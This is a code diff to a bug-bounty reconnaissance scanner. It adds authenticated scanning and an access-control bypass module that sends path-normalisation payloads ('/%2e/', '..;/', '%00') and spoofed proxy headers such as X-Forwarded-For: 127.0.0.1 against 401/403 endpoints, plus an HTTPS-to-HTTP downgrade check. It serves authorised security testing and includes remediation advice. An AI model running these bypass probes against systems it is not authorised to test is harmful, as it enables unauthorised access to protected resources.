@@ -5,6 +5,15 @@ bounty_recon.py — All-in-one Bug Bounty Recon, Scanner & AI Triage
 Version : see VERSION constant below (single source of truth)
 License : MIT
 
+New in v4.5 (authenticated scanning + access-control bypass, 2026):
+  ✦ Authenticated scans      — --cookie / --auth-state (Playwright storageState)
+                               / --header, replayed on every request
+  ✦ Access-control bypass    — on 401/403 endpoints, try %2e/..; path
+                               normalisation + X-Forwarded-*/X-Original-URL spoofs
+  ✦ TLS downgrade check      — flag https endpoints that 3xx → cleartext http://
+  (Generalised from an authorised n8n/Next.js engagement; target-specific
+   webhook/SSRF recipes live in ARSENAL.md, not as FP-prone auto-probes.)
+
 New in v4.4 (curated upgrade, 2026):
   ✦ Test suite               — pytest covering the pure logic (JWT, secrets,
                                SARIF, cookies, entropy, dedup, severity order)
@@ -144,7 +153,7 @@ except ImportError:
     HAS_PLAYWRIGHT = False
 
 # ── Constants ─────────────────────────────────────────────────────────────────
-VERSION  = "4.4.0"
+VERSION  = "4.5.0"
 TIMEOUT  = 12
 UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
 BROWSER_HEADERS = {
@@ -542,6 +551,7 @@ HTTP_CFG = {
     "timeout":  TIMEOUT,
     "active":   False,  # gate for intrusive (injection) probes
     "verbose":  False,
+    "extra_headers": {},  # auth / custom headers sent on every request
 }
 
 class _RateLimiter:
@@ -572,7 +582,8 @@ _RL = _RateLimiter(0.0)
 _CLIENT = None
 _CLIENT_LOCK = __import__("threading").Lock()
 
-def configure_http(threads=None, rate=None, retries=None, timeout=None, active=None, verbose=None):
+def configure_http(threads=None, rate=None, retries=None, timeout=None, active=None,
+                   verbose=None, extra_headers=None):
     global _RL
     if threads is not None:  HTTP_CFG["threads"] = max(1, int(threads))
     if rate    is not None:  HTTP_CFG["rate"]    = float(rate)
@@ -580,6 +591,7 @@ def configure_http(threads=None, rate=None, retries=None, timeout=None, active=N
     if timeout is not None:  HTTP_CFG["timeout"] = int(timeout)
     if active  is not None:  HTTP_CFG["active"]  = bool(active)
     if verbose is not None:  HTTP_CFG["verbose"] = bool(verbose)
+    if extra_headers is not None:  HTTP_CFG["extra_headers"] = dict(extra_headers)
     _RL = _RateLimiter(HTTP_CFG["rate"])
 
 def _get_client():
@@ -616,6 +628,8 @@ def http_get(url: str, headers: dict = None, follow: bool = True, timeout: int =
     unrecoverable failure (callers already wrap this in try/except)."""
     timeout = timeout or HTTP_CFG["timeout"]
     h = dict(BROWSER_HEADERS)
+    if HTTP_CFG.get("extra_headers"):
+        h.update(HTTP_CFG["extra_headers"])  # global auth / custom headers
     if headers:
         h.update(headers)
     attempts = HTTP_CFG["retries"] + 1
@@ -2015,6 +2029,180 @@ CACHE_POISON_HEADERS = [
     ("X-Forwarded-Scheme", "nothttps"),
 ]
 
+# ══════════════════════════════════════════════════════════════════════════════
+# v4.5: authenticated scanning + access-control-bypass + TLS downgrade
+# (generalised from an authorised n8n/Next.js engagement — storageState replay,
+#  %2e/..; path-normalisation WAF bypass, X-Forwarded-* spoofing, 307→http)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def cookies_from_storage_state(data: dict) -> str:
+    """Playwright storageState JSON -> a 'n=v; n2=v2' Cookie header string.
+
+    Accepts the {"cookies":[{"name","value",...}], "origins":[...]} shape.
+    Returns "" if there are no cookies.
+    """
+    if not isinstance(data, dict):
+        return ""
+    pairs = []
+    for c in data.get("cookies", []) or []:
+        if isinstance(c, dict) and c.get("name"):
+            pairs.append(f"{c['name']}={c.get('value', '')}")
+    return "; ".join(pairs)
+
+
+def parse_header_args(items) -> dict:
+    """['Name: Value', ...] -> {'Name': 'Value'}. Raises ValueError on a bad item."""
+    out = {}
+    for item in items or []:
+        if ":" not in item:
+            raise ValueError(f"bad --header (need 'Name: Value'): {item!r}")
+        name, value = item.split(":", 1)
+        if not name.strip():
+            raise ValueError(f"bad --header (empty name): {item!r}")
+        out[name.strip()] = value.strip()
+    return out
+
+
+def build_auth_headers(cookie: str = None, auth_state_path: str = None,
+                       header_items=None) -> dict:
+    """Assemble the global auth/custom header dict from the CLI auth options."""
+    headers = {}
+    cookie_str = cookie or ""
+    if auth_state_path:
+        with open(auth_state_path, encoding="utf-8") as fh:
+            cookie_str = (cookie_str + "; " if cookie_str else "") + \
+                cookies_from_storage_state(json.load(fh))
+    if cookie_str:
+        headers["Cookie"] = cookie_str
+    headers.update(parse_header_args(header_items))
+    return headers
+
+
+def path_bypass_variants(path: str) -> list:
+    """Path-normalisation mutations used to bypass edge/WAF path ACLs.
+
+    Deduplicated, order-preserving. Based on the %2e / ..; / //-style tricks
+    (Kettle path-normalisation, nginx/CF edge-vs-origin parsing differentials).
+    """
+    p = path if path.startswith("/") else "/" + path
+    seg = p.lstrip("/")
+    variants = [
+        "/%2e/" + seg,
+        "/" + seg + "/..;/",
+        "/" + seg + "%2f",
+        "/." + seg,
+        "//" + seg,
+        "/%2e" + seg,
+        "/" + seg + "/.",
+        "/" + seg + "..;/",
+        "/;/" + seg,
+        "/" + seg + "%00",
+    ]
+    seen, out = set(), []
+    for v in variants:
+        if v not in seen:
+            seen.add(v); out.append(v)
+    return out
+
+
+# Header sets that frequently bypass IP/host-based access control on an origin
+# that trusts a fronting proxy. Each is tried against a 401/403 endpoint.
+HEADER_BYPASS_SETS = [
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Forwarded-For": "localhost"},
+    {"X-Real-IP": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Forwarded-Host": "localhost"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
+    {"X-Original-URL": "/"},
+    {"X-Rewrite-URL": "/"},
+    {"X-Forwarded-Proto": "http"},
+]
+
+
+def is_cleartext_downgrade(target_url: str, location: str) -> bool:
+    """True if an https target redirects to a cleartext http:// Location."""
+    if not target_url.lower().startswith("https://") or not location:
+        return False
+    loc = location.strip().lower()
+    # Protocol-relative (//host) keeps the scheme → not a downgrade.
+    return loc.startswith("http://")
+
+
+def detect_access_control_bypass(url: str) -> list:
+    """If `url` is 401/403, try path-normalisation + header spoofs for a 200.
+
+    Only fires on a genuine access-control boundary (baseline 401/403). A
+    variant that flips it to 200 is reported High and must be confirmed by hand.
+    """
+    findings = []
+    try:
+        base_status, _, base_body = http_get(url, follow=False)
+    except Exception:
+        return findings
+    if base_status not in (401, 403):
+        return findings
+    base_len = len(base_body or b"")
+
+    from urllib.parse import urlsplit, urlunsplit
+    parts = urlsplit(url)
+    origin = f"{parts.scheme}://{parts.netloc}"
+    path = parts.path or "/"
+
+    # 1) path-normalisation variants
+    for variant_path in path_bypass_variants(path):
+        try:
+            st, _, body = http_get(origin + variant_path, follow=False)
+        except Exception:
+            continue
+        if st in (200, 201) and len(body or b"") > 0 and len(body or b"") != base_len:
+            findings.append({"severity": "High", "category": "access-bypass",
+                "title": "Access-control bypass via path normalisation",
+                "url": origin + variant_path,
+                "detail": f"Baseline {url} = HTTP {base_status}; variant = HTTP {st} "
+                          f"({len(body)} bytes). Edge/WAF path ACL bypassed.",
+                "command": f'curl -sk -o /dev/null -w "%{{http_code}}" "{origin + variant_path}"',
+                "remediation": "Normalise the path BEFORE the ACL check; match edge and origin parsers."})
+            break
+    # 2) header spoof variants
+    for hdrs in HEADER_BYPASS_SETS:
+        try:
+            st, _, body = http_get(url, headers=hdrs, follow=False)
+        except Exception:
+            continue
+        if st in (200, 201) and len(body or b"") > 0 and len(body or b"") != base_len:
+            findings.append({"severity": "High", "category": "access-bypass",
+                "title": "Access-control bypass via trusted-proxy header spoof",
+                "url": url,
+                "detail": f"Baseline HTTP {base_status}; with {hdrs} = HTTP {st} "
+                          f"({len(body)} bytes). Origin trusts a client-supplied proxy header.",
+                "command": f'curl -sk -H "{list(hdrs)[0]}: {list(hdrs.values())[0]}" "{url}"',
+                "remediation": "Never trust X-Forwarded-*/X-Original-URL from clients; strip them at the edge."})
+            break
+    return findings
+
+
+def detect_tls_downgrade(url: str) -> list:
+    """Flag an https endpoint that 3xx-redirects to cleartext http://."""
+    findings = []
+    if not url.lower().startswith("https://"):
+        return findings
+    try:
+        status, hdrs, _ = http_get(url, follow=False)
+    except Exception:
+        return findings
+    location = hdrs.get("location") or hdrs.get("Location") or ""
+    if 300 <= status < 400 and is_cleartext_downgrade(url, location):
+        findings.append({"severity": "Medium", "category": "tls-downgrade",
+            "title": "HTTPS endpoint redirects to cleartext HTTP",
+            "url": url,
+            "detail": f"HTTP {status} → Location: {location}. Traffic is downgraded to http:// "
+                      "(MITM / cookie-leak exposure before HSTS can apply).",
+            "command": f'curl -skI "{url}" | grep -i "^location"',
+            "remediation": "Redirect only to https:// and send HSTS with includeSubDomains + preload."})
+    return findings
+
+
 def detect_cache_poisoning(base_url: str) -> list:
     """Probe for unkeyed-header reflection (classic web-cache-poisoning primitive).
 
@@ -3107,7 +3295,17 @@ def main():
     ap.add_argument("--cve",                  action="store_true", help="CVE fingerprint detection")
     ap.add_argument("--cache-poison",         action="store_true", dest="cache_poison", help="Host-override cache-poisoning probe")
     ap.add_argument("--lib-versions",         action="store_true", dest="lib_versions", help="Detect outdated JS libraries (retire.js-lite)")
+    ap.add_argument("--access-bypass",        action="store_true", dest="access_bypass",
+                    help="On 401/403 endpoints, try path-normalisation (dot-encoding / ..;) + X-Forwarded-* spoofs for a 200")
+    ap.add_argument("--tls-downgrade",        action="store_true", dest="tls_downgrade",
+                    help="Flag https endpoints that 3xx-redirect to cleartext http://")
     ap.add_argument("--full",                 action="store_true", help="Enable ALL optional modules")
+    # ── v4.5: authenticated scanning (cookie / Playwright storageState / headers) ─
+    ap.add_argument("--cookie",               help="Cookie header sent on every request, e.g. 'sid=...; csrf=...'")
+    ap.add_argument("--auth-state",           dest="auth_state",
+                    help="Playwright storageState JSON file; its cookies are replayed on every request")
+    ap.add_argument("--header",               action="append", default=[], dest="headers", metavar="'Name: Value'",
+                    help="Extra header on every request (repeatable), e.g. --header 'Authorization: Bearer ...'")
     # ── v4.0: profiles, concurrency, safety gate, output ──────────────────────
     ap.add_argument("--profile",              choices=["passive","safe","aggressive"], default=None,
                     help="passive=read-only recon; safe=+non-destructive probes; aggressive=+injection/active (implies --active)")
@@ -3153,7 +3351,8 @@ def main():
             setattr(args, m, True)
     elif args.profile == "safe":
         for m in ["js","s3","graphql","waf","wayback","param_mine","cve","lib_versions",
-                  "open_redirect","idor","lfi_xxe","race","cache_poison","nuclei"]:
+                  "open_redirect","idor","lfi_xxe","race","cache_poison","nuclei",
+                  "access_bypass","tls_downgrade"]:
             setattr(args, m, True)
     elif args.profile == "aggressive":
         args.full = True
@@ -3165,10 +3364,22 @@ def main():
         args.ssrf = args.open_redirect = args.ssti = args.proto_pollution = True
         args.race = args.idor = args.lfi_xxe = args.wayback = args.param_mine = True
         args.cve = args.idn = args.cache_poison = args.lib_versions = True
+        args.access_bypass = args.tls_downgrade = True
+
+    # Authenticated scanning: build the global cookie/header set once.
+    try:
+        _auth_headers = build_auth_headers(args.cookie, args.auth_state, args.headers)
+    except (OSError, ValueError, json.JSONDecodeError) as exc:
+        print(f"error: {exc}", file=sys.stderr)
+        sys.exit(1)
+    if _auth_headers:
+        which = [k for k in _auth_headers]
+        print(f"🔐 Authenticated scan: sending {', '.join(which)} on every request")
 
     # Configure the shared HTTP layer (connection pool, rate limit, retries, gate)
     configure_http(threads=args.threads, rate=args.rate, retries=args.retries,
-                   timeout=args.timeout, active=args.active, verbose=args.verbose)
+                   timeout=args.timeout, active=args.active, verbose=args.verbose,
+                   extra_headers=_auth_headers)
 
     domain   = args.target.replace("https://","").replace("http://","").split("/")[0]
     base_url = args.url or f"https://{domain}"
@@ -3396,6 +3607,19 @@ def main():
         console.print("\n[bold]17c. Outdated JS Libraries[/bold]" if HAS_RICH else "\n17c. Outdated Libs")
         for url in scan_urls[:3]:
             for lf in detect_js_lib_versions(url): all_findings.append(lf)
+
+    # 17d. Access-control bypass on 401/403 endpoints (path-norm + header spoof)
+    if getattr(args, "access_bypass", False):
+        console.print("\n[bold]17d. Access-Control Bypass[/bold]" if HAS_RICH else "\n17d. Access-Control Bypass")
+        ac_targets = list(dict.fromkeys(scan_urls[:5] + [lh["url"] for lh in live]))
+        for url in ac_targets:
+            for bf in detect_access_control_bypass(url): all_findings.append(bf)
+
+    # 17e. HTTPS → cleartext HTTP downgrade
+    if getattr(args, "tls_downgrade", False):
+        console.print("\n[bold]17e. TLS Downgrade[/bold]" if HAS_RICH else "\n17e. TLS Downgrade")
+        for lh in live:
+            for tf in detect_tls_downgrade(lh["url"]): all_findings.append(tf)
 
     # 18. JS secrets + endpoints
     all_endpoints, all_routes = set(), set()
